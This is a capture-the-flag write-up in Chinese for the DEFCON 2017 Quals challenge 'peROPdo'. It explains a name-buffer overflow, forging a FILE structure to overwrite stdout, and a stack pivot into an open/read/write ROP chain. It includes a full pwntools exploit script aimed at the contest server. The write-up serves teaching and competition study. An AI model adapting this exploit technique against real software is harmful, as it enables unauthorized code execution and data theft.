---
title: '[DEFCON CTF 2017 Quals] peROPdo'
author: bruce30262
tags:
  - pwn
  - buffer overflow
  - ROP
  - file stream pointer overflow
  - DEFCON CTF 2017
categories:
  - write-ups
date: 2017-05-03 23:31:00
---
## Info  
> Category: Potent Pwnables
> Author: bruce30262 @ BambooFox  

## Analyzing
32 bit ELF, **static linked & stripped**, 有開 DEP 保護

程式是個簡單的骰子程式，輸入完名字後程式會問你要骰幾個骰子，輸入一個正整數後，程式會隨機產生資料，存在 `data[i]` 裡面。之後程式會輸出 `data[i] % 6 + 1`，代表這一輪我們骰的數字。

這題有兩個漏洞:
1. 輸入名字時是用 `scanf("%s", name);` 的方式讀取，造成 `name` buffer 有 overflow 的情形 (`name`位於 data 段)  
2. 程式存資料 `data[i]` 是存在 stack 上，因此如果我們骰太多骰子的話，會造成 `data[i]` 的資料覆蓋到 return address ( stack overflow )。

## Exploit
一開始本來打算利用第二個漏洞 ( stack overflow ) 來做 exploit，不過因為 `data[i]` 的資料是隨機化的結果，我們沒辦法隨心所欲的控制 return address 的內容。

這邊在解題時犯了一個錯誤: **誤認為程式所用的隨機化函式是自行 implement 的函式**。因為 binary 被 stripped 掉的關係，加上是 static linked 的 binary，因此當時無法判斷哪些是自行 implement 的 function，哪些是 libc 內部的 function。也因為這樣，在這題浪費了大量的時間在搞 symbolic execution tool，想說可以利用這些工具來幫助我們解出想要的 return address。結果 [angr](http://angr.io/) 不會用，[Triton](https://github.com/JonathanSalwan/Triton) 跟 [manticore](https://github.com/trailofbits/manticore) 則是連跑都跑不起來，一整個慘...... 

後來就想說換個方向，試試看第一個漏洞 ( `name` 的 buffer overflow )。結果發現到說可以控到 EIP，似乎是因為在 `name` buffer 的後面存有一些 `FILE*` pointer，導致我們可以透過[偽造`FILE`](https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/)結構來達到 hijack control flow 的效果。

於是透過一些動態分析，我們發現說我們可以透過一個 `call [reg+offset]` 的 gadget 來控制 EIP，且第二個參數會是 `stdout`。於是我先將程式跳至 main function 的中間:
```
mov     dword ptr [esp+4], offset name
mov     dword ptr [esp], (offset aSSSS+8) ; "%s" <--- 跳到這裡
call    scanf
mov     eax, ds:name
mov     [esp], eax
call    sub_0804baf0
mov     dword ptr [esp], offset name
call    do_main
```

會這樣跳是因為接下來程式會將 `%s` 放到第一個參數，並且呼叫 `scanf()`，讓程式執行 `scanf("%s", stdout)`，我們就可以完整的控制 `stdout` 的內容，之後就可以做更進一步的 ROP attack  

以下是我最後的 ROP chain:
* 先用 `xchg esp, eax` 將 stack migrate 至 `stdout` (此時 stdout 內容可控)
* 利用 `add esp, offset` gadget 跳過 `stdout` 結構 ( 必須跳過一些我們偽造的 data )
* 利用 gadgets 作出 open/read/write 的 syscall，將 flag 吐出來 ( 這題有擋 `execve()` )

Final exploit:
```python exp_peropdo.py
#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

HOST = "peropdo_bb53b90b35dba86353af36d3c6862621.quals.shallweplayaga.me"
PORT = 80
ELF_PATH = "./peropdo"

context.binary = ELF_PATH
context.log_level = 'INFO' # ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.terminal = ['tmux', 'splitw'] # for gdb.attach

elf = context.binary # context.binary is an ELF object

if __name__ == "__main__":

    r = remote(HOST, PORT)
    #r = process(ELF_PATH)
    
    #gdb.attach(r, gdbscript=open("./ggg", "r"))
    func = 0x0806d7aa # avoid crash
    scanf = 0x08048b2a
    name = p32(scanf) + p32(func) + "\x42"*972 + p32(0x80ecdf4) + '\x00'*92  + p32(0x80ecdf8) 
    r.sendlineafter("name?", name)

    # Later the program will call scanf("%s", stdout);
    # now we can overwrite the whole stdout FILE structure

    stream = p32(0x08079824) # second gadget: add esp, 0x84....
    stream += "/home/peropdo/flag\x00" # flag path
    stream = stream.ljust(0x1c, '\0')
    stream += p32(0x804b45c) # eip, first gadget: xchg esp, eax ; ret
    stream = stream.ljust(0x48, '\0')
    stream += p32(0x080ED3E8) # pointer to null
    stream = stream.ljust(0x90, '\0')
    stream += p32(0x807982b) # third gadget: pop; ret
    stream += p32(0x80eb2a0) # fake jump table
    
    # 0x08074f2e : mov eax, 5 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 
    # 0x08079465 : mov ebx, eax ; mov eax, ebx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
    pop_ebx = 0x806f322  # pop ebx;ret
    pop_eax = 0x80e3525  # pop eax;ret
    pop_ecx = 0x080e5ee1 # pop ecx ; ret 
    pop_edx = 0x0806f2fa # pop edx ; ret
    int80 = 0x806fae0    # int 0x80 ; ret 
    buf = 0x80ed000-0x100
    rop = flat(
                pop_ecx,
                0,
                pop_edx, 
                0,
                0x08074f2e, # mov eax = 5 (open), pop ebx...
                0x80eb2a4, # ptr to flag path
                [0,0,0],
                int80,              
                pop_eax,
                3, # read
                pop_ebx,
                3, #fd
                pop_ecx,
                buf,
                pop_edx,
                0x100,
                int80,
                pop_ebx,
                1, # fd,
                pop_eax,
                4, # write
                int80
              )

    r.sendline(stream + rop)
    r.interactive()
```

flag: `Thanks to Kenshoto for the inspiration! 5fbb34920c457b2e0855a174b8de3ebc`

## Note
這題解到一半時，隊友 **Isaac** 提醒說 IDA 有個東西叫 [FLIRT](https://www.hex-rays.com/products/ida/tech/flirt/index.shtml)，可以透過一些 [signature database](https://github.com/push0ebp/sig-database) 來辨別 libc 的 function，讓我們在做 reversing 時可以輕鬆一點。直到那時我才知道，程式裡面的隨機化函式其實就只是 libc 裡面的 `srand()` 和 `random()`......所以其實可以直接用暴力法把我們要跳的 return address 給爆出來......不過當時用 file stream pointer overflow 解到一半了，就沒有用這種方式解，要不然應該會快上許多。就當作是長經驗吧 Q_Q


